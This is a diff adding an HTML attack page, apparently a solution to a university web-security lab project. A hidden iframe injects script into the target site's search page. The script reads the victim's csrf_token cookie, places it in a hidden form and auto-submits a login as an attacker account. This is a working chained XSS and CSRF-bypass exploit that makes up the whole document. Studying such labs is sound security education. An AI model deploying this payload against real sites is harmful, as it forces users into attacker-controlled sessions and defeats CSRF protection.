@@ -1,0 +1,13 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<iframe id="form1" style="width: 0px; height: 0px; visibility: hidden" name="hidden"></iframe>
+
+<script>
+var path = "http://eecs388.org/project2/search?xssdefense=0&csrfdefense=1&q=";
+var query="<iframe style='width: 0px; height: 0px; visibility: hidden' name='hidden'></iframe><form name='form1' method='post' action='http://eecs388.org/project2/login' target='hidden'><input type='hidden' name='username' value='attacker'><input type='hidden' name='password' value='l33th4x'><input type='hidden' name='csrfdefense' value='1'><input type='hidden' name='xssdefense' value='0'><input type='text' name='csrf_token'></form><script>function getCookie(c_name) { var c_value = document.cookie; var c_start = c_value.indexOf(' ' + c_name + '='); if (c_start == -1) { c_start = c_value.indexOf(c_name + '='); } if (c_start == -1) { c_value = null; } else { c_start = c_value.indexOf('=', c_start) + 1; var c_end = c_value.indexOf(';', c_start); if (c_end == -1) { c_end = c_value.length; } c_value = unescape(c_value.substring(c_start,c_end)); } return c_value; }$(\"input[name='csrf_token']\").val(getCookie('csrf_token'));document.form1.submit()</scr"+"ipt>";
+var url = path + encodeURIComponent(query);
+$(function(){
+	$("#form1").attr("src" , url);
+});
+</script>
